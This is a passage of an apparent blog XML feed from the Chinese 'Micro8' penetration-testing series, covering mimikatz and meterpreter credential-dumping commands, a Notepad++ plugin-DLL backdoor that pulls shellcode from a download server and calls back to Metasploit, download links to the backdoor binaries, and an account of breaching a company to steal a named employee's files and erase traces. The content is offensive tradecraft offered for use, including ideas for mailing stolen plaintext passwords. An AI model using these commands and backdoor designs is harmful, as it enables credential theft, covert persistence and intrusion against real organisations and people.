class="keyword">const</span> <span class="keyword">uint</span> MEM_RELEASE = <span class="number">0x8000</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>65、离线提取目标机hash补充</title>
      <link href="/article/65_%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash%E8%A1%A5%E5%85%85.html"/>
      <url>/article/65_%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash%E8%A1%A5%E5%85%85.html</url>
      
        <content type="html"><![CDATA[<p>上一季下载sys.hiv,sam.hiv,security.hiv文件后，以Linux下为背景来离线提取hash，本季补充以windows为背景离线提取hash。</p><p>mimikatz 2.0 二进制文件下载地址：<br><a href="https://github.com/gentilkiwi/mimikatz/releases/latest" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases/latest</a><br>切到当下目录（注意X86,X64位）</p><p>mimikatz离线导hash命令：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../do/media/92ae7706ceec3aa04bce07e08ced2e16.jpg" alt></p><p>mimikatz在线导hash命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="../do/media/88ab6bceca9f6a733b768b1ccfefe688.jpg" alt></p><p>当然关于提取目标机的hash，msf也内置了离线提取与在线提取hash。</p><p>meterpreter下hashdump命令来提取hash（注意当前权限）<br><img src="../do/media/79e0ae6ee3518126f0c11872201c70fb.jpg" alt>  </p><p><img src="../do/media/5808e7c6ac005d96f8289f994db6e45e.jpg" alt></p><p>msf同时也内置了mimikatz，meterpreter执行load mimikatz即可加载该插件。<strong>（这里一定要注意，msf默认调用于payload位数相同的mimikatz）</strong>  </p><p><img src="../do/media/3535a826c17c149f290fd79bd2fe865a.jpg" alt></p><p>直接执行kerberos即可。  </p><p><img src="../do/media/0134f11ff22c5d4450f173c8e5ce9717.jpg" alt></p><p>当然有些情况下，payload位数无误，权限无误，依然无法提取目标机的密码相关。需要调用mimikatz自定义命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><p><img src="../do/media/ae5d3f87f6df54f4a42bfa231e5847c0.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>64、高级持续渗透-第八季demo便是远控</title>
      <link href="/article/64_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%85%AB%E5%AD%A3demo%E4%BE%BF%E6%98%AF%E8%BF%9C%E6%8E%A7.html"/>
      <url>/article/64_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%85%AB%E5%AD%A3demo%E4%BE%BF%E6%98%AF%E8%BF%9C%E6%8E%A7.html</url>
      
        <content type="html"><![CDATA[<ul><li>本季是《高级持续渗透-第七季demo的成长》的延续。</li><li><a href="https://micropoor.blogspot.com/2019/01/php-demo.html" target="_blank" rel="noopener">https://micropoor.blogspot.com/2019/01/php-demo.html</a></li></ul><p>在第一季关于后门中，文章提到重新编译notepad++，来引入有目标源码后门构造。</p><p>在第六季关于后门中，文章<strong>假设在不得知notepad++的源码</strong>，来引入无目标源码沟门构造。</p><p>在第七季关于后门中，文章让demo与上几季中对比，更贴近于实战。</p><p>而在第八季，继续优化更新demo，强调<strong>后门链</strong>在高级持续渗透中的作用。  </p><p><strong>该系列仅做后门思路。</strong><br>在上季中引用一个概念：<strong>“安全是一个链安全，攻击引入链攻击，后门引入链后门”</strong>，而<strong>”链”</strong>的本质是<strong>增加对手的时间成本，金钱成本，人力成本等。</strong></p><p>第七季的文章结尾是这样写道：<br><img src="../do/media/2a31f56e4b7965091e8e18bfe2cd7f74.jpg" alt></p><p>而增改后门每一个功能，则需要更改demo的功能，或者增加几个功能的集合。那么它并不是一个标准的”链”后门。为了更好的强调“链”后门在高级持续渗透中的作用。第八季把demo打造成一个远控。以及可结合任意第三方渗透框架。</p><p>远控4四大要素：  </p><ul><li>可执行cmd命令  </li><li>可远程管理目标机文件，文件夹等  </li><li>可查看目标摄像头  </li><li>注册表和服务操作  </li><li>等等</li></ul><p>而以上功能需要大量的代码以及大量的特征加入到该dll里，而此时，后门不在符合实战要求。从而需要重新构建后门。<strong>思路如下：</strong>dll不实现任何后门功能，只做“后门中间件”。而以上功能则第四方来实现。第三方作为与后门建立连接关系。</p><p><strong>Demo 环境：</strong>  </p><ul><li>Windows 2003 x64   </li><li>Windows 7 x64   </li><li>Debian  </li><li>notepad++ 7.6.1，notepad++7.5.9   </li><li>vs 2017</li></ul><p><strong>Windows 2003： ip 192.168.1.119</strong><br><img src="../do/media/ffe803cd6661fb184f853dd1e8ba8391.jpg" alt></p><p><strong>开放端口：</strong><br><img src="../do/media/036c0df07b733b1903b954719d1d9eae.jpg" alt></p><p><strong>notepad++版本：</strong><br><img src="../do/media/8b2395faa9f773202a5fb8b72ee1a02e.jpg" alt><br>notepad++v7.6以下版本插件直接放入<code>X:\Program Files(x86)\Notepad++\plugins</code>目录下即可。</p><p><strong>放置后门：</strong><br><img src="../do/media/e547ccb1c7b63469a8e2704a699a13e3.jpg" alt></p><p><strong>配置后门链：</strong><br><strong>配置下载服务器：</strong><br><img src="../do/media/ed8fcd774103d0e9b6fa90cfef6dc449.jpg" alt></p><p><strong>配置msf：</strong><br><img src="../do/media/226afc0a697337a71103b8e25cace952.jpg" alt></p><p><strong>再次打开notepad++：</strong></p><p>变化如下：</p><p><strong>下载服务器：</strong><br><img src="../do/media/10658c38abf21ebbb51649d392bc21f8.jpg" alt></p><p><strong>msf服务器：</strong><br><img src="../do/media/733488673f8750f3027f9564bf4bb8c0.jpg" alt></p><p><strong>执行顺序为：</strong>  </p><ul><li>notepad++挂起dll后门  </li><li>后门访问下载服务器读取shellcode  </li><li>根据shellcode内容，加载内存  </li><li>执行shellcode</li></ul><p>Micropoor.rb核心代码如下：<br><img src="../do/media/bbc4b855a51b83fa6823ce5a51787ede.jpg" alt></p><p>而此时，无需在对dll的功能改变而更改目标服务器，只需更改下载服务器shellcode，以messagebox为例：<br>msf生成shellcode如下：<br><img src="../do/media/3ce86fbf179f37e3a08f69d39855209c.jpg" alt></p><p>替换下载服务器shellcode：<br><img src="../do/media/5c590d0ad57d1818403a9e618549e6e1.jpg" alt></p><p>再次运行notepad++，弹出messagebox，而无msf payload功能。</p><p><img src="../do/media/1059bc2acf3d13cb9cd61c98647439e5.jpg" alt></p><p><strong>后者的话：</strong><br>在第八季中，只需配置一次目标服务器，便完成了对目标服务器的“后门”全部配置。以减小最小化接触目标服务器，来减少被发现。而以后得全部配置，则在下载服务器中。来调用第四方框架。并且目标服务器只落地一次文件，未来其他功能都将会直接加载到内存。大大的增加了管理人员的对抗成本。“后门链”的本质是增加对手的时间成本，金钱成本，人力成本等。而对于攻击者来说，下载，执行，后门分别在不同的IP。对于对抗安全软件，仅仅需要做“落地”的exe的加解密shellcode。</p><p>附：<br><strong>Micropoor.rb</strong>  </p><blockquote><p>大小: 1830 字节<br>修改时间: 2019年1月4日, 15:46:44<br>MD5: D5647F7EB16C72B94E0C59D87F82F8C3<br>SHA1: BDCFB4A9B421ACE280472B7A8580B4D9AA97FC22 CRC32: ABAB591B</p></blockquote><p><a href="https://drive.google.com/open?id=1ER6Xzcw4mfc14ql4LK0vBBuqQCd23Apg" target="_blank" rel="noopener">https://drive.google.com/open?id=1ER6Xzcw4mfc14ql4LK0vBBuqQCd23Apg</a></p><p><strong>MicroNc.exe</strong><br><strong>注：强烈建议在虚拟中测试，因Micropoor已被安全软件加入特征，故报毒。</strong></p><blockquote><p>大小: 93696 字节<br>修改时间: 2019年1月4日, 15:50:41<br>MD5: 42D900BE401D2A76B68B3CA34D227DD2<br>SHA1: B94E2D9828009D80EEDDE3E795E9CB43C3DC2ECE CRC32: CA015C3E</p></blockquote><p><a href="https://drive.google.com/open?id=1ZKKPOdEcfirHb2oT1opxSKCZPSplZUSf" target="_blank" rel="noopener">https://drive.google.com/open?id=1ZKKPOdEcfirHb2oT1opxSKCZPSplZUSf</a></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>63、高级持续渗透-第七季demo的成长</title>
      <link href="/article/63_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%83%E5%AD%A3demo%E7%9A%84%E6%88%90%E9%95%BF.html"/>
      <url>/article/63_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%83%E5%AD%A3demo%E7%9A%84%E6%88%90%E9%95%BF.html</url>
      
        <content type="html"><![CDATA[<p>本季是作《PHP安全新闻早八点-高级持续渗透-第六季关于后门》的补充。  </p><ul><li><a href="https://micropoor.blogspot.com/2018/12/php.html" target="_blank" rel="noopener">https://micropoor.blogspot.com/2018/12/php.html</a>  </li><li><strong>原本以为第六季的demo便结束了notepad++</strong>  </li><li><strong>但是demo系列的懿旨并没有按照作者的想法来表述。顾引入第七季。</strong></li></ul><p>在第一季关于后门中，文章提到重新编译notepad++，来引入有目标源码后门构造。</p><p>在第六季关于后门中，文章<strong>假设在不得知notepad++的源码</strong>，来引入无目标源码沟门构造。</p><p>而第七季关于后门中，让这个demo更贴合于实战。此季让这个demo成长起来。它的<br>成长痕迹分别为第一季，第六季，第七季。</p><p><strong>该系列仅做后门思路。</strong></p><p><strong>懿旨：安全是一个链安全，攻击引入链攻击，后门引入链后门。让渗透变得更加有趣。</strong></p><p><strong>Demo 环境：</strong>  </p><ul><li>Windows 2003 x64  </li><li>Windows 7 x64  </li><li>notepad++ 7.6.1，notepad++7.5.9   </li><li>vs 2017</li></ul><p><strong>靶机以notepad++ 7.5.9为例：</strong>  </p><p>默认安装notepad++流程图，如下：一路下一步。  </p><p><img src="../do/media/b8aac18b874785f0c8bc969f75b77a65.jpg" alt></p><p><img src="../do/media/2f08b914ac8b52592b2b7e0993f62040.jpg" alt></p><p><img src="../do/media/3794646c3d867b1761b4195a01ee0735.jpg" alt></p><p><strong>目标机背景：</strong> windows 2003，x64，notepad++ 7.6.1，notepad++7.5.9，iis，aspx</p><p><img src="../do/media/c20afc4dccc75cb4a95cb2e46575b4fd.jpg" alt></p><p><strong>shell权限如下：</strong>  </p><p><img src="../do/media/2b489f025ac208347291fd42ed7a6a1a.jpg" alt></p><p><strong>notepad++7.5.9</strong>  </p><ul><li>安装路径：E:\Notepad++\  </li><li>插件路径：E:\Notepad++\plugins\  </li></ul><p><img src="../do/media/6837e346988cc844adf8ed91f6c40103.jpg" alt></p><p><strong>检查默认安装情况如下：</strong><br><img src="../do/media/3fc723c290e8134bb050a2d6ff692351.jpg" alt></p><p>注：为了让本季的demo可观性，顾不打算隐藏自身。<br><img src="../do/media/0f916c3a715bd62f5f92ff97ebe29572.jpg" alt></p><p>端口如下：<br><img src="../do/media/4bbdb3e33cf96125bdf0886ac59eaefc.jpg" alt></p><p>shell下写入：<br><strong>注：</strong><br><strong>notepad++ v7.6以下版本插件路径为：</strong><br><code>X:\Notepad++\plugins\</code></p><p><strong>notepad++ v7.6以上版本插件路径为：</strong><br><code>X:\Documents and Settings\All Users\Application Data\Notepad++\plugins</code></p><p><img src="../do/media/1cbf6f87cfa8d6d24fdb4f755c5210dc.jpg" alt></p><p>目标机管理员再次打开notepad++：<br><strong>注：demo中不隐藏自身</strong><br><img src="../do/media/10feb51a838194fbcc604cb596b1c9b3.jpg" alt></p><p>端口变化如下：<br><img src="../do/media/f96508fcfb44dd1cff346ccdaad50fdb.jpg" alt></p><p>msf 连接目标机：<br><img src="../do/media/637712a99f114ff8c074927dc8f3a756.jpg" alt></p><p><strong>后者的话：</strong></p><p>如果此demo，增加隐身自身，并demo功能为：增加隐藏帐号呢？或者往指定邮箱发目标机帐号密码明文呢？如果当第六季依然无法把该demo加入到实战中，那么请回顾。这样实战变得更为有趣。<strong>安全是一个链安全，攻击引入链攻击，后门引入链后门。让渗透变得更加有趣。</strong></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>62、高级持续渗透-第六季关于后门</title>
      <link href="/article/62_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%85%AD%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.html"/>
      <url>/article/62_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%85%AD%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>本季是作《php安全新闻早八点-高级持续渗透-第一季关于后门》的补充。</p></li><li><p><a href="https://micropoor.blogspot.com/2017/12/php.html" target="_blank" rel="noopener">https://micropoor.blogspot.com/2017/12/php.html</a></p></li></ul><p>在第一季关于后门中，文章提到重新编译notepad++，来引入有目标源码后门构造。本季继续以notepad++作为demo，而本季引入无目标源码构造notepad++ backdoor。</p><p>针对服务器，或者个人PC，安装着大量的notepad++，尤其是在实战中的办公域，或者运维机等，而这些机器的权限把控尤为重要。</p><p>该系列仅做后门思路。</p><p>Demo 环境：  </p><ul><li>Windows 2003 x64  </li><li>Windows 7 x64   </li><li>notepad++ 7.6.1   </li><li>vs 2017</li></ul><p>遵守第一季的原则，demo未做任何对抗安全软件，并且demo并不符合实战要求。仅提出思路。<strong>由于demo并未做任何免杀处理。导致反病毒软件报毒。如有测试，建议在虚拟机中进行测试。</strong></p><p>Windows 2003： ip 192.168.1.119</p><p><img src="../do/media/b75265b26ccaad160f2b330c1f34cbad.jpg" alt></p><p><strong>开放端口：</strong>  </p><p><img src="../do/media/7cabec4d0c6df5398c037a5cf49409e9.jpg" alt></p><p>notepad++版本：  </p><p><img src="../do/media/803ead4ea5a34c01522a57b00234e914.jpg" alt></p><p>导入dll插件：  </p><p><img src="../do/media/b70624aaa775d1e94bd6f43d7a67a0ca.jpg" alt></p><p>notepad++ v7.6.x以上版本提示，后重新打开notepad++，来触发payload。  </p><p><img src="../do/media/4d150b5afc1fdf0c2282f6cd0e336053.jpg" alt></p><p>开放端口变化如下：  </p><p><img src="../do/media/e5a060d48960be08f10fe584929bc78f.jpg" alt></p><p>msf连接：  </p><p><img src="../do/media/fc72a7bb494445813a098e0b26245dc5.jpg" alt></p><p><img src="../do/media/45b069f7d3ce3035e7996b7187efc8d1.jpg" alt></p><p><strong>后者的话：</strong><br>demo借助了notepad++的证书，在通过notepad++来调用自身。本季的demo并不符合实战要求。在实战中，当目标人启动notepad++时，或者抓取密码发送到指定邮箱，或者在做一次调起第四方后门等，这是每一位信息安全从业人员应该考虑的问题。</p><p>关于后门，无论是第一季还是最六季，都侧面的强调了shellcode的分离免杀，后<br>门”多链”的调用触发。同样，攻击分离，加大防御者的查杀成本，溯源成本，以及时间成本。给攻击者争取最宝贵的时间。</p><p>PS：<br>关于mimikatz的分离免杀参考上一季《体系的本质是知识点串联》，<br><a href="https://micropoor.blogspot.com/2018/12/blog-post.html。" target="_blank" rel="noopener">https://micropoor.blogspot.com/2018/12/blog-post.html。</a></p><p>本demo 不支持notepad++ v7.6版本。因为此问题为notepad++官方bug。7.6.1更新如下：  </p><p><img src="../do/media/bc3b1d714d98b0c1a02cd99923b06173.jpg" alt></p><p><strong>为此调试整整一天。才发现为官方bug。</strong></p><p>Demo for dll：</p><p><strong>由于demo并未做任何免杀处理。导致反病毒软件报毒。如有测试，建议在虚拟机中进行测试。demo仅做开放443端口。等待主机连接。</strong></p><blockquote><p><strong>HTMLTags_x32.dll</strong><br>大小: 73728 字节文件版本: 1.4.1.0<br>修改时间: 2018年12月31日, 18:51:20<br>MD5: FDF30DD5494B7F8C61420C6245E79BFE<br>SHA1: D23B21C83A9588CDBAD81E42B130AFE3EDB53EBB CRC32: D06C6BD1</p></blockquote><p><a href="https://drive.google.com/open?id=1_sFKMWi6Zuy1_v82Ro1wZR8OrqKr7GD4" target="_blank" rel="noopener">https://drive.google.com/open?id=1_sFKMWi6Zuy1_v82Ro1wZR8OrqKr7GD4</a></p><blockquote><p><strong>HTMLTags_x64.dll</strong><br>大小: 88064 字节文件版本: 1.4.1.0<br>修改时间: 2018年12月31日, 18:51:09<br>MD5: D7355FF1E9D158B6F917BD63159F4D86<br>SHA1: 9E6BC1501375FFBC05A8E20B99DC032C43996EA3 CRC32: 606E5280</p></blockquote><p><a href="https://drive.google.com/open?id=1JwmW8KrxYoQ1Dk_VNtnDs0MxM6tuqCs\" target="_blank" rel="noopener">https://drive.google.com/open?id=1JwmW8KrxYoQ1Dk_VNtnDs0MxM6tuqCs\</a>_</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>61、高级持续渗透-第五季关于后门</title>
      <link href="/article/61_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%BA%94%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.html"/>
      <url>/article/61_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%BA%94%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.html</url>
      
        <content type="html"><![CDATA[<p>这一季依然是一个过渡季，根据之前的连载中，了解到后门是渗透测试的分水岭，它分别体现了攻击者对目标机器的熟知程度，环境，编程语言，了解对方客户，以及安全公司的本质概念。也同样检测了防御者需要掌握后门的基本查杀，与高难度查杀，了解被入侵环境，目标机器。以及后门或者病毒可隐藏角落，或样本取证，内存取证等。对各种平台查杀熟知，对常见第三方软件的了解程度。既然题目以“艺术”为核心，那么怎样把后门“艺术”行为化呢？</p><p>依然遵循以往，引入概念，<strong>只有概念清晰，本质清晰，对于攻击者，这样的后门更具有持久性，潜伏性，锁定性等。对于防御者，更能熟知反后门对抗，对待常用第三方软件的检测方式方法，切断攻击者的后渗透攻击。溯源或取证攻击者。</strong></p><p>在高级持续渗透测试中，PTES的渗透测试执行标准主要分为<strong>6段1报</strong>。既：</p><ul><li>1.前期交互阶段</li><li>2.情报收集阶段</li><li>3.威胁建模阶段</li><li>4.漏洞分析阶段</li><li>5.渗透攻击阶段</li><li>6.后渗透攻击阶段</li><li>7.报告编写</li></ul><p>这里要讲的不是打破它的流程，而是归纳总结到类，明确了类的方向，对待一个未知的目标网络环境，更能清晰的进行攻击或者对抗。</p><p><strong>提权的本质是什么？</strong><br><strong>信息搜集，</strong>搜集目标补丁情况，了解目标第三方利用等。</p><p><strong>内网渗透的本质是什么？</strong><br><strong>信息搜集，</strong>搜集目标内网的组织架构，明确渗透诉求，在渗透过程中，当获取到内网组织架构图，如鱼得水。</p><p><strong>渗透与高级持续渗透的本质区别是什么？</strong><br>区别于“持续”，可长期根据攻击者的诉求来潜伏持久的，具有针对性的<strong>信息获取</strong>。</p><p>（而在高级持续渗透它又分为2类，一类持久渗透，一类即时目标渗透）</p><p><strong>溯源取证与对抗溯源取证的本质是什么？</strong><br><strong>信息搜集</strong>与<strong>对抗信息搜集</strong>。</p><p>以上4条，清晰的明确了类，以及类方向，在一次完整的实战过程中，攻击者与防御者是需要角色对换的，前期，攻击者信息搜集，防御者对抗信息搜集。而后渗透，攻击者对抗信息搜集，防御者信息搜集。</p><p>而在两者后的持续把控权限，是随机并且无规律的角色对换过程。主要表现之一为后门。这一句话也许很难理解，举例：</p><p>持续把控权限过程中，攻击者需要对抗防御者的信息搜集，而又要根据对方行为制定了解防御者的相关动作以及熟知目标环境的信息搜集安全时间。（包括但不限制于如防御者近期对抗查杀动作，防御者的作息规律，目标环境的作息规律等来制定相关计划）。</p><p>而在持续把控权限的过程中，防御者需要定期不完全依赖安全产品对自身环境的信息进行搜集（包括但不限制于日志异常，登陆异常，数据异常，第三方篡改日常等），一旦发现被攻击或者异常，对抗攻击者搜集，并且搜集攻击信息，攻击残留文件，排查可能沦陷的内网群，文件等。</p><p>在一次的引用百度百科对APT的解释：APT是黑客以窃取核心资料为目的，针对客户所发动的网络攻击和侵袭行为，是一种蓄谋已久的“恶意商业间谍威胁”。这种行为往往经过长期的经营与策划，并具备高度的隐蔽性。APT的攻击手法，在于隐匿自己，针对特定对象，长期、有计划性和组织性地窃取数据，这种发生在数字空间的偷窃资料、搜集情报的行为，就是一种“网络间谍”的行为。</p><p>实战中的APT又主要分为2大类，一类<strong>持久渗透</strong>，一类<strong>即时目标渗透</strong>，主要区别于高级持续渗透是6段1报，即时目标渗透是5段1清1报，共同点都是以黑客以窃取核心资料为目的，并且是一种蓄谋已久的长期踩点针对目标监视（包括但不限制于服务更新，端口更新，web程序更新，服务器更新等）。不同点主要区别于即时目标渗透清晰目标网络构架或是明确诉求，得到目标诉求文件，随即销毁自身入侵轨迹。结束任务。而<strong>即时目标渗透</strong>往往<strong>伴随</strong>着<strong>传统的人力情报</strong>的配合进行网络行动。</p><p>在即时目标渗透测试中，主要分为<strong>5段1清1报</strong>。既：</p><ol><li>前期交互阶段</li><li>情报收集阶段</li><li>威胁建模阶段</li><li>漏洞分析阶段</li><li>渗透攻击阶段</li><li>清理攻击痕迹</li><li>报告编写</li></ol><p>持久渗透以时间换空间为核心的渗透，以最小化被发现，长期把控权限为主的渗透测试。</p><p>即时目标渗透则相反，放大已知条件，关联已知线索，来快速入侵，以达到诉求。</p><p>为了更好的解释APT即时目标渗透，举例某实战作为demo（由于是为了更好的解释即时目标渗透，所以过程略过），大部分图打码，见谅。</p><p><strong>任务背景：</strong>  </p><p><strong>任务诉求：</strong>需要得知周某某的今年采购的其中一个项目具体信息。  </p><p><strong>已知条件：</strong>该成员是xxx某大型公司。负责XXXX的采购人员。配合人力得知姓名，电话，身份证，照片等。  </p><p><strong>任务时间：</strong>一周之内  </p><p><strong>制定计划：</strong>找到开发公司，获取源码，代码审计，得到shell，拿到服务器，得到域控（或者终端管理）。得到个人机。下载任务文件。  </p><p><strong>任务过程：</strong>得知该XXX公司xxxx网站是某公司出品，得到某公司对外宣传网站，并且得到该开发公司服务器权限，下载源码模板。</p><p><strong>源码审计过程略过</strong>。得到webshell  </p><p><img src="../do/media/2fe13eec49008cd875bcd3e7619491fd.jpg" alt></p><p><strong>提权略过</strong>。得到服务器权限。  </p><p><img src="../do/media/bc8b996a04d17fb9b2925bd69e1b8255.jpg" alt></p><p><strong>内网渗透略过</strong>，配合人力情报，大致清楚目标内网架构。直奔内网终端管理系统。</p><p>查看在线机器，查找目标人物。  </p><p><img src="../do/media/d87c7fd9e8a9de62908a472f0f09c7b3.jpg" alt></p><p>任务推送执行：  </p><p><img src="../do/media/d82e217006eefca3e84a8e2a0b26042d.jpg" alt></p><p>目标回链：  </p><p><img src="../do/media/a0c66ae414ba3f932645544960023d94.jpg" alt></p><p>目标桌面截图：确定为目标人物  </p><p><img src="../do/media/a6825a164053779edd90124e5f922423.jpg" alt></p><p>下载任务文件后，清理入侵痕迹。任务完成。  </p><p><img src="../do/media/38de4714588b7828df92ec373feeef25.jpg" alt></p><p>那么持久渗透，即时目标渗透的主要表现区别即为后持续渗透，无后门的安装，无再次连接目标。以及传统人力情报的配合。</p><p>那么在demo中，如果需要长期跟踪，并且对方的内网中有多款安全产品，那么就要为它来制定一款针对该目标的后门。在传统后门中，大多数只考虑目标机系统环境，那么题目为“后门”的艺术，在今天强大的安全产品中对抗升级中，后门也开始加入了人性化因素。以及传统后门的特性变更：如无进程，无服务，无端口，无自启，无文件等，来附属在第三方上。根据目标环境的人为特点，上线时间，操作时间。来制定一次后门的唤醒时间。需要了解目标经常使用的第三方软件，来制定后门类型。（参考第一季）。</p><p>如何把后门定制到更贴近目标，来对抗反病毒，反后门查杀。利用人为化来启动，或者第三方唤醒，这应该是值得攻击者思考的问题。</p><p>而明确了类与类的方向，如何阻断攻击者的信息搜集，并且加大攻击者的暴露踪迹，减少非必要的第三方，这应该是指的防御者思考的问题。</p><p>后门在对抗升级中，越贴近目标的后门越隐蔽，越贴近人性化的后门越持久，而由于目前存储条件等因素，还不能够全流量的全部记录，而是全流量的部分流量记录。导致不能完全依赖安全产品，并且在实战中，往往并不是每一台机器（包括但不限制于服务器，个人机，办公及）都遵循安全标准。尤其是在当今VPN办公普遍的情况下，家用个人机为突破点的例子层出不穷。其他非人为因素等。导致了当下的安全再次回归到安全的初衷：人。是的，人是安全的尺度。</p><p><strong>/*段子*/</strong>  </p><p><img src="../do/media/b53363eb4c102d2a4b61aba52e2c941c.jpg" alt></p><p>可能某老夫跳出来，大喊，后门的人性化制作就这一个也能算艺术？  </p><p>在现实中，我很喜欢问别人三个问题：  </p><ol><li>你用过最糟糕的后门是什么样的？  </li><li>你用过最精彩的后门是什么样的？  </li><li>你最理想的后门是什么样的？</li></ol><p>问题1.能大致分析出对方的入行时间<br>问题2.能大致的判断出对方目前的技术水平<br>问题3.能直接判断出对方对技术的追求是怎样的心态<br>后门是一种艺术。</p><p>在文章的结尾处，我想贴几个图。<br><strong>当初：多么简单的知识，都会找到你想要的教程。多么复杂的知识都会找到相关的文章。</strong>  </p><p><img src="../do/media/e834f6dc7f8f3848d3b0f7dc14565c6b.jpg" alt></p><p><img src="../do/media/9157b6422e4b34d3096dd087d49ffbc1.jpg" alt></p><p><strong>现在：想学习的人，找不到入门的知识，与可以建立兴趣的文章。想分享的人却又胆战心惊。</strong>  </p><p><img src="../do/media/8cb82dc96d28bef71fb4fc92bd23e9b7.jpg" alt>  </p><p><img src="../do/media/1063e83fc58870b13b2f800f7370fe8e.jpg" alt>  </p><p><img src="../do/media/95296aceabdce450b483c7cb0cd0674d.jpg" alt></p><p><strong>来自知乎某大V的回忆当初：</strong>  </p><p><img src="../do/media/8d207f338f4c48676512d4a3c2b981a0.jpg" alt></p><p><img src="../do/media/cd40207db31f9fee13eed92fcae1cb12.jpg" alt></p><p><img src="../do/media/72b54cd4d2c3fb02d37d3fb1fd26c518.jpg" alt></p><p>黑吧的logo还是曾经的那个logo，联盟的国徽还是那个国徽，只是人的心变了。</p><p>附录：  </p><p>PTES中文版<br><a href="http://netsec.ccert.edu.cn/hacking/files/2011/07/PTES_MindMap_CN1.pdf" target="_blank" rel="noopener">http://netsec.ccert.edu.cn/hacking/files/2011/07/PTES_MindMap_CN1.pdf</a></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>60、高级持续渗透-第四季关于后门</title>
      <link href="/article/60_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%9B%9B%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.html"/>
      <url>/article/60_%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%9B%9B%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.html</url>
      
        <content type="html"><![CDATA[<p>第四季是一个过渡季，过渡后门在对抗升级中由传统后门，衍生成锁定目标的制定后门。引用百度百科的“后门程序”的相关解释：  </p><p><a href="https://baike.baidu.com/item/%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/108154" target="_blank" rel="noopener">https://baike.baidu.com/item/%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/108154</a>  